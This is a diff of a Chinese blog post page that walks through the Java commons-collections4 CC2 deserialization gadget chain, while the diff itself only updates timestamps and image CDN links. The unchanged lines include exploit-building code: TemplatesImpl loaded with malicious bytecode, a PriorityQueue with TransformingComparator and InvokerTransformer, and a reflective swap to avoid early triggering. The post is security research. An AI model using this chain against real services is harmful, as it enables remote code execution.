@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-04-06T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-04-06T08:43:38.045Z">
+<meta property="article:modified_time" content="2026-05-14T10:03:45.593Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="Java">
@@ -68,7 +68,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp2fxa3a">
+  <link rel="stylesheet" href="/css/main.css?v=mp5bt8l7">
 
 
   
@@ -77,7 +77,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-06T12:00:00+08:00","dateModified":"2026-04-06T16:43:38+08:00","datePublished":"2026-04-06T12:00:00+08:00","description":"","headline":"代码审计 | CC2 链 —— _tfactory 赋值问题 PriorityQueue 新入口","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/d7f9a3c1/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/d7f9a3c1/","keywords":"代码审计, Java, 反序列化, Java反序列化, CC链","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/08a7105b75182080de31b152077c6681.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-06T12:00:00+08:00","dateModified":"2026-05-14T18:03:45+08:00","datePublished":"2026-04-06T12:00:00+08:00","description":"","headline":"代码审计 | CC2 链 —— _tfactory 赋值问题 PriorityQueue 新入口","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/d7f9a3c1/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/d7f9a3c1/","keywords":"代码审计, Java, 反序列化, Java反序列化, CC链","thumbnailUrl":"https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/08a7105b75182080de31b152077c6681.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -145,7 +145,7 @@
 <p>pom.xml 依赖改成这样：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405152949570.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405152949570.png"></p>
 <p>包名也从 <code>org.apache.commons.collections</code> 变成了 <code>org.apache.commons.collections4</code>，导包的时候注意一下。</p>
 <hr>
 <h2 id="链路分析"><a href="#链路分析" class="headerlink" title="链路分析"></a>链路分析</h2><p>还是习惯从 sink 反推，找清楚每个节点怎么串起来的，再写 EXP。</p>
@@ -155,41 +155,41 @@
 <hr>
 <p><strong>半 payload 测试（未走反序列化）</strong></p>
 <p>之前的文章判断是说 <code>defineTransletClasses</code> 函数里有 <code>_tfactory.getExternalExtensionsMap()</code> 的调用，所以 <code>_tfactory</code> 必须赋值。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405154116053.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405154116053.png"></p>
 <p>但当时测试用的是”半 payload”，直接调用 <code>templates.newTransformer()</code> 触发，并没有走完整的反序列化流程：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">wu_</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;target\\classes\\org\\example\\EvilClass.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f1</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f1.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f2.set(templates, <span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"><span class="comment">//        Field f3 = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        f3.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        f3.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        templates.newTransformer(); <span class="comment">// 应该弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405161510127.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405161510127.png"></p>
 <p>把 <code>_tfactory</code> 赋值注释掉之后，得到的是 NullPointerException（NPE），错误出现在 <code>defineTransletClasses</code> 函数里的 <code>_tfactory.getExternalExtensionsMap()</code> 这里，字节码还没开始加载链就断了。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405162758646.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405162758646.png"></p>
 <p>调试发现此时 <code>_tfactory</code> 确实是 null：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405161848994.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405161848994.png"></p>
 <p>所以当时得出了”必须给 <code>_tfactory</code> 反射赋值”的结论。</p>
 <p>赋值之后：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405163051914.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405163051914.png"></p>
 <p>虽然还有 NPE 报错，但位置不在 <code>defineTransletClasses</code> 里了——这些报错都是字节码加载完之后的事，payload 已经正常执行，计算器弹出。</p>
 <hr>
 <p><strong>完整 payload 测试（走完整反序列化）</strong></p>
 <p>写这篇文章的时候又发现了新问题。用 CC3 的完整 payload（CC3TransformedMap）测试，之前说是需要赋值的：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405163542209.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405163542209.png"></p>
 <p>演示也没有问题，有 NPE 但不是 <code>defineTransletClasses</code> 里的。调试找到 <code>_tfactory</code>，确实有值：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405164124133.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405164124133.png"></p>
 <p>然后把 <code>_tfactory</code> 的赋值注释掉再试：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405164603485.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405164603485.png"></p>
 <p><strong>依然可以弹出？！</strong> 而且也没有出现之前半 payload 里 <code>defineTransletClasses</code> 的 NPE 报错。</p>
 <p>调试看 <code>_tfactory</code> 的值：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405164742850.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405164742850.png"></p>
 <p>我们没有手动赋值，但 <code>_tfactory</code> 还是有值。原因是 <code>TemplatesImpl</code> 类的 <code>readObject</code> 方法里有这么一行：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure>
 
 <p>反序列化的时候会自动为 <code>_tfactory</code> 创建对象并赋值：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405165014108.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405165014108.png"></p>
 <p>经过调试进一步发现，不管我们有没有手动给 <code>_tfactory</code> 赋值，进入反序列化流程之后 <code>_tfactory</code> 显示的都是 null——这是因为反序列化不仅会触发最外层对象的 <code>readObject</code>，链里面每个对象如果有 <code>readObject</code> 方法，也都会被自动调用。<code>TemplatesImpl</code> 自己的 <code>readObject</code> 里会重新初始化 <code>_tfactory</code>，所以手动赋值根本没用。</p>
 <hr>
 <p><strong>还有个小问题：为什么赋值了但 _tfactory 调试里显示还是 null？</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405165548507.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405165548507.png"></p>
 <p>查看 <code>_tfactory</code> 的属性，发现它带了 <code>transient</code> 修饰符：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405165751259.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405165751259.png"></p>
 <p><code>transient</code> 的作用很简单：序列化的时候这个字段直接被跳过，不写进字节流。所以不管你有没有手动赋值，序列化之后这个值都不存在了，反序列化时由 <code>readObject</code> 重新创建。</p>
 <p>而 <code>_name</code>、<code>_bytecodes</code> 都是普通的私有属性，没有 <code>transient</code>，所以可以正常序列化传递。</p>
 <hr>
@@ -205,14 +205,14 @@
 
 <p>CC2 不走这条路，目标是直接找到一个能触发 <code>TemplatesImpl.newTransformer()</code> 的方法。</p>
 <hr>
-<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405174253095.png"></p>
+<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405174253095.png"></p>
 <p>这就是一个封装了反射调用的 Transformer：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(input, iArgs);</span><br><span class="line">  method  — 要调用的方法对象，通过 input.getClass().getMethod(iMethodName, iParamTypes) 拿到</span><br><span class="line">  input   — 调用这个方法的对象，也就是方法的调用者</span><br><span class="line">  iArgs   — 传给这个方法的参数列表</span><br></pre></td></tr></table></figure>
 
 <p>等价于直接写：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">templatesImpl.newTransformer();</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405184226000.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405184226000.png"></p>
 <p><code>InvokerTransformer</code> 有两个构造方法，参数不一样。第一个是私有的，用第二个。如果两个都是私有的，就需要用反射拿到私有构造方法再调用(如果这样就又会出现新问题,不会自动触发)：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;InvokerTransformer&gt; constructor = InvokerTransformer.class.getDeclaredConstructor(String.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);  <span class="comment">// 突破 private 限制</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>
 
@@ -224,13 +224,13 @@
 <hr>
 <h3 id="TransformingComparator（关键节点）"><a href="#TransformingComparator（关键节点）" class="headerlink" title="TransformingComparator（关键节点）"></a>TransformingComparator（关键节点）</h3><p>CC2 里用的是 <code>TransformingComparator.compare()</code> 来触发 <code>transform()</code>。</p>
 <p><code>TransformingComparator</code> 是 CC2 新引入的核心类，以前的链里没用过。它实现了 <code>Comparator</code> 接口，内部持有一个 <code>Transformer</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405181929431.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405181748671.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405181929431.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405181748671.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;O&gt; decorated;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? <span class="keyword">extends</span> <span class="title class_">O</span>&gt; transformer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>只需要让 <code>transformer</code> 是 <code>InvokerTransformer</code>，就能触发 <code>InvokerTransformer.transform()</code>，再把 <code>obj</code> 换成 <code>TemplatesImpl</code> 实例，链就通了。</p>
 <p><code>TransformingComparator</code> 第一个构造方法只需要传入一个参数：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405191628134.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405191628134.png"></p>
 <p>（<code>this(...)</code> 是在构造方法里调用同类的另一个构造方法）</p>
 <p>直接 new 一个对象：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br></pre></td></tr></table></figure>
@@ -238,11 +238,11 @@
 <p>这样 <code>transformer</code> 就是 <code>invokerTransformer</code> 了。</p>
 <p>下面解决 <code>compare</code> 的两个参数 <code>(final I obj1, final I obj2)</code> 从哪里来的问题。</p>
 <p><code>TransformingComparator</code> 实现了 <code>Comparator</code> 接口，<code>compare</code> 方法就是在这个接口里定义的：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405193634774.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405193634774.png"></p>
 <p>查找用法，有很多函数都调用了 <code>compare</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405193956559.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405193956559.png"></p>
 <p>最终找到的是 <code>PriorityQueue</code> 里的 <code>siftDownUsingComparator</code> 方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405200256058.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405200256058.png"></p>
 <p>这里面调用了两次 <code>comparator.compare</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">comparator.compare((E) c, (E) queue[right])  // 比较左右子节点</span><br><span class="line">comparator.compare(x, (E) c)                 // 比较父节点和子节点</span><br></pre></td></tr></table></figure>
 
@@ -253,38 +253,38 @@
 
 <p><code>queue[]</code> 就是 <code>PriorityQueue</code> 内部存元素的数组。所以只需要往这里面添加 <code>TemplatesImpl</code> 实例，<code>c</code> 和 <code>queue[right]</code> 就都是 <code>TemplatesImpl</code>，自然作为 <code>obj1</code> 和 <code>obj2</code> 传进 <code>compare()</code>。</p>
 <p>上面有 <code>add</code> 函数：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405221441003.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405221441003.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> offer(e);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405221521254.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405221521254.png"></p>
 <p>这正是添加数据的函数，直接用：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue.add(templates);</span><br></pre></td></tr></table></figure>
 
 <p>不过 <code>compare</code> 是在 <code>siftDownUsingComparator</code> 里调用的，而且这是个私有方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405222101566.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405222101566.png"></p>
 <p>思路就是往上找能调用到这个私有方法的公有方法。链条是：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readObject() → heapify() → siftDown() → siftDownUsingComparator() → compare()</span><br></pre></td></tr></table></figure>
 
 <p><code>siftDownUsingComparator</code> 往上是 <code>siftDown</code>，私有方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405223057425.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405223057425.png"></p>
 <p>再往上是 <code>heapify</code>，也是私有：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405223157201.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405223157201.png"></p>
 <p>终点就是 <code>readObject</code> 方法，同样是私有的，但没关系——反序列化该执行还是执行：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405223314861.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405223314861.png"></p>
 <p>现在完整的链已经找到了，只需要传入正确的参数就能自动触发。</p>
 <hr>
 <p><strong>构造 PriorityQueue</strong></p>
 <p><code>PriorityQueue</code> 的构造方法有点多，都是对 <code>initialCapacity</code> 和 <code>comparator</code> 参数的控制。选一个参数少、又能传入我们需要的参数的方法：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_INITIAL_CAPACITY 默认是 11</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405224913614.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405224913614.png"></p>
 <p>这两个构造方法都能传入 <code>TransformingComparator</code> 对象（里面有 <code>compare</code> 方法触发 <code>transform</code>），不过一个默认容量是 11，我们只需要传入 2 个元素，选第二个：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405225001014.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405225001014.png"></p>
 <p>现在的构造顺序：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">queue.add(templates);</span><br><span class="line">queue.add(templates);</span><br></pre></td></tr></table></figure>
 
 <p>不过直接这样写是不行的——序列化的时候会弹出一次计算器：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405230431807.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405230431807.png"></p>
 <p>反序列化的时候反而没有效果了。</p>
 <p>原因是：往 <code>PriorityQueue</code> 里 <code>add()</code> 元素的时候，也会触发堆排序，也就是说也会调用 <code>comparator.compare()</code>。如果这时候 transformer 已经是 <code>InvokerTransformer</code>，add 阶段就提前触发了一次 RCE，而且这时候第二个元素还没 add 进去，排序逻辑出问题，导致后面反序列化时链跑不起来了。</p>
 <p>解决方法是<strong>构造时先用无害的 Transformer 占位，add 完元素再通过反射替换成 InvokerTransformer</strong>：</p>
@@ -292,39 +292,39 @@
 
 <p>无害占位用的是 <code>ConstantTransformer</code>——不管传入什么都返回里面固定的值，比 <code>InvokerTransformer(&quot;toString&quot;, null, null)</code> 这种写法更安全简单。</p>
 <p>结果正常：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405232257989.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260405232257989.png"></p>
 <hr>
 <h2 id="完整调用链追踪"><a href="#完整调用链追踪" class="headerlink" title="完整调用链追踪"></a>完整调用链追踪</h2><p>现在顺着跟一遍完整的调用流程：</p>
 <p>入口的 <code>readObject</code> 读取文件：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124332093.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124332093.png"></p>
 <p>自动触发我们对象（<code>PriorityQueue</code>）的 <code>readObject</code> 方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124424017.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124424017.png"></p>
 <p><code>readObject</code> 里调用 <code>heapify</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124509322.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124509322.png"></p>
 <p><code>heapify</code> 触发 <code>siftDown</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124540675.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124540675.png"></p>
 <p><code>siftDown</code> 触发 <code>siftDownUsingComparator</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124618325.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124618325.png"></p>
 <p><code>siftDownUsingComparator</code> 里调用 <code>compare</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124642150.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124642150.png"></p>
 <p><code>compare</code> 里传入两个 <code>TemplatesImpl</code> 对象触发，此时 <code>transformer</code> 已经是被反射替换过的 <code>InvokerTransformer</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124718839.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124819725.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124718839.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124819725.png"></p>
 <p><code>transform</code> 触发反射调用 <code>TemplatesImpl.newTransformer</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124942339.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406125101148.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406124942339.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406125101148.png"></p>
 <p><code>newTransformer</code> 触发 <code>getTransletInstance</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406125601692.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406125601692.png"></p>
 <p>中间经过 <code>defineTransletClasses</code> 对 <code>_tfactory</code> 的处理（前面讲过，反序列化时自动赋值）：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406125738394.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406125738394.png"></p>
 <p>最终到 <code>getTransletInstance</code> 里的 <code>newInstance</code> 实例化对象，触发构造方法执行 RCE：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406125920497.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406125920497.png"></p>
 <hr>
 <h2 id="为什么必须用-CC-4-0"><a href="#为什么必须用-CC-4-0" class="headerlink" title="为什么必须用 CC 4.0"></a>为什么必须用 CC 4.0</h2><p>在 CC 3.2.1 里，<code>TransformingComparator</code> 没有实现 <code>Serializable</code>：</p>
 <p>CC 3.2.1：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406130704876.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406130704876.png"></p>
 <p>CC 4.0：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406130211928.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260406130211928.png"></p>
